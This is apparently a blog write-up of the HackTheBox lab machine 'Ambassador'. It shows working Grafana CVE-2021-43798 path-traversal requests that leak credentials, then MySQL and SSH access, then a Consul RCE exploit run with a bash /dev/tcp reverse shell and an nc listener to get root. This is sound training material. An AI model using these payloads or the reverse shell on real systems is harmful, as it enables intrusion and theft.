---
title:  "Hackthebox - Ambassador"
date:   2023-01-29 23:00:00 +0100
categories: hackthebox
published: true
---

{% include image-center.html url="/assets/htb-ambassador.png" alt="Info Card" %}

## Network Enumeration

### Nmap

Scanning the box with [nmap](https://tools.kali.org/information-gathering/nmap) revealed 4 open TCP ports: SSH on port 22, potential webservers on port 80 and 3000 and a mysql server on port 3306:
```bash
$ cat nmap/tcp_allports.nmap 
# Nmap 7.93 scan initiated Sat Dec 10 20:41:08 2022 as: nmap -v --min-rate=1000 -T4 -Pn -p- -oN nmap/tcp_allports.nmap 10.10.11.183
Nmap scan report for 10.10.11.183
Host is up (0.046s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
3306/tcp open  mysql

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Dec 10 20:41:23 2022 -- 1 IP address (1 host up) scanned in 14.95 seconds
```

### 22 - SSH

SSH requires credentials for access, which we will most likely obtain via another service. Skipping further enumeration for now.

### 80 - HTTP

The content of the website hints that we can login as `developer` via SSH:

{% include image-center.html url="/assets/htb-ambassador/1.png" alt="Info Card" %}

### 3000 - HTTP

We can access a Grafana instance v8.2.0, which is by default vulnerable to arbitrary file read via CVE-2021-43798.

Exploit: see https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798

### 3306 - MySQL

Anonymous access or access with default credentials (tried a few), is not possible. Skipping for now, revisiting when having obtained valid credentials.

## Initial Foothold

As discovered during enumeration, it is possible to read arbitrary files from the filesystem by exploiting the vulnerable Grafana instance on port 3000.

The admin password for Grafana can be retrieved by accessing `/etc/grafana/grafana.ini` as follows:

Request:
```http
GET /public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/grafana/grafana.ini HTTP/1.1
Host: ambassador.htb:3000
Connection: close
```

Response:
```http
HTTP/1.1 200 OK
...
Connection: close

#################################### Security ####################################
[security]
# disable creation of admin user on first start of grafana
;disable_initial_admin_creation = false

# default admin user, created on startup
;admin_user = admin

# default admin password, can be changed before first start of grafana,  or in profile settings
admin_password = messageInABottle685427
```

Logging in as admin with `admin:messageInABottle685427` is possible.

There is a datasource configured, but we cannot see the password via UI:

{% include image-center.html url="/assets/htb-ambassador/2.png" alt="Info Card" %}

The Grafana [documentation](https://grafana.com/docs/grafana/v9.3/administration/provisioning/#data-sources) states that datasource yaml files can be placed inside the `provisioning/datasources` directory. This directory is most possibly inside `/etc/grafana` as described [here](https://grafana.com/docs/grafana/latest/administration/provisioning/). 

The corresponding request for reading the `mysql.yaml` datasource file looks as follows:
```http
GET /public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/grafana/provisioning/datasources/mysql.yaml HTTP/1.1
Host: ambassador.htb:3000
Connection: close
```

Response:
```http
HTTP/1.1 200 OK
...
Connection: close

apiVersion: 1

datasources:
 - name: mysql.yaml 
   type: mysql
   host: localhost
   database: grafana
   user: grafana
   password: dontStandSoCloseToMe63221!
   editable: false
```

This gives us the following MySQL creds: `grafana:dontStandSoCloseToMe63221!`

## User

We can access the mysql server with above credentials. Looking at the content of the database `whackywidget` reveals credentials for the `developer` user:
```mysql
$ mysql -u grafana -h ambassador.htb -p'dontStandSoCloseToMe63221!'
...
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows in set (0.052 sec)

MySQL [(none)]> use whackywidget;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [whackywidget]> show tables;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.046 sec)

MySQL [whackywidget]> select * from users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
1 row in set (0.045 sec)
```

The password looks base64-encoded, and decoding it leads to meaningful output:

```bash
$ echo YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==  | base64 -d
anEnglishManInNewYork027468                                 
```

Potential SSH Credentials:
```
developer:anEnglishManInNewYork027468
```

Logging in via SSH works with above credentials:

```bash
$ ssh developer@ambassador.htb 
developer@ambassador.htb's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)
...
Last login: Fri Sep  2 02:33:30 2022 from 10.10.0.1
developer@ambassador:~$
```

### Flag

The user flag can be found inside `developer`'s home directory:

```bash
developer@ambassador:~$ cat user.txt 
6d278***************************
```

## Root

Running [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) provides interesting output:

```bash 
root        1097  0.3  3.7 794292 75460 ?        Ssl  19:40   0:18 /usr/bin/consul agent -config-dir=/etc/consul.d/config.d -config-file=/etc/consul.d/consul.hcl     

╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      -                    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                    
tcp        0      0 127.0.0.1:8600          0.0.0.0:*               LISTEN      -                    
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                    
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -                    
tcp        0      0 127.0.0.1:8300          0.0.0.0:*               LISTEN      -                    
tcp        0      0 127.0.0.1:8301          0.0.0.0:*               LISTEN      -                    
tcp        0      0 127.0.0.1:8302          0.0.0.0:*               LISTEN      -                    
tcp6       0      0 :::22                   :::*                    LISTEN      -                    
tcp6       0      0 :::3000                 :::*                    LISTEN      -                    
tcp6       0      0 :::80                   :::*                    LISTEN      - 

╔══════════╣ Analyzing Github Files (limit 70)

-rw-rw-r-- 1 developer developer 93 Sep  2 02:28 /home/developer/.gitconfig


drwxrwxr-x 8 root root 4096 Mar 14  2022 /opt/my-app/.git


╔══════════╣ Unexpected in /opt (usually empty)
total 16
drwxr-xr-x  4 root   root   4096 Sep  1 22:13 .
drwxr-xr-x 20 root   root   4096 Sep 15 17:24 ..
drwxr-xr-x  4 consul consul 4096 Mar 13  2022 consul
drwxrwxr-x  5 root   root   4096 Mar 13  2022 my-app

╔══════════╣ Unexpected in root
/development-machine-documentation


╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/auth.log
/var/log/syslog
/var/log/journal/435fd3a763ad485cb5dd1b15b05cc6b8/system.journal
/var/log/journal/435fd3a763ad485cb5dd1b15b05cc6b8/user-1000.journal
/var/log/kern.log
/opt/consul/raft/raft.db

```

The `/opt/my-app` directory seems to contain a git repository.

Looking at the git history reveals a token for Consul:

```bash
developer@ambassador:/opt/my-app$ git log
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:44:45 2022 +0000

    config script

...

developer@ambassador:/opt/my-app$ git diff c982db8eff6f10f8f3a7d802f79f2705e7a21b55..33a53ef9a207976d5ceceddc41a199558843bf3c
diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
index 35c08f6..fc51ec0 100755
--- a/whackywidget/put-config-in-consul.sh
+++ b/whackywidget/put-config-in-consul.sh
@@ -1,4 +1,4 @@
 # We use Consul for application config in production, this script will help set the correct values for the app
-# Export MYSQL_PASSWORD before running
+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
 
-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
```

There is a working [exploit](https://github.com/owalid/consul-rce/blob/main/consul_rce.py), providing RCE via Consul service config: When registering a service, the `Args` value inside `Check` section can contain a command that gets executed. Submitting a request to the REST interface for service configuration requires a Consul token which we just found. 

See also:
* [Consul commands - services](https://developer.hashicorp.com/consul/commands/services)
* [Consul dicovery - services](https://developer.hashicorp.com/consul/docs/discovery/services)


The exploit from above can be used as-is together with a custom Bash script that contains a reverse shell:

```bash
$ cat myshell.sh 
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.17/9999 0>&1
$ chmod +x myshell.sh
$ python3 exploit.py  -th 127.0.0.1 -tp 8500 -c "/dev/shm/myshell.sh" -ct bb03b43b-1d81-d62b-24b5-39540ee469b5
[+] Check lbnlwmvqeutvoov created successfully
[+] Check lbnlwmvqeutvoov deregistered successfully
```

Listener on attacker box:

```bash
$ nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.183] 50524
bash: cannot set terminal process group (54098): Inappropriate ioctl for device
bash: no job control in this shell
root@ambassador:/# 
```

### Flag

Finally, we can read the root flag:
```bash
root@ambassador:/# cat /root/root.txt
6428bf**************************
```
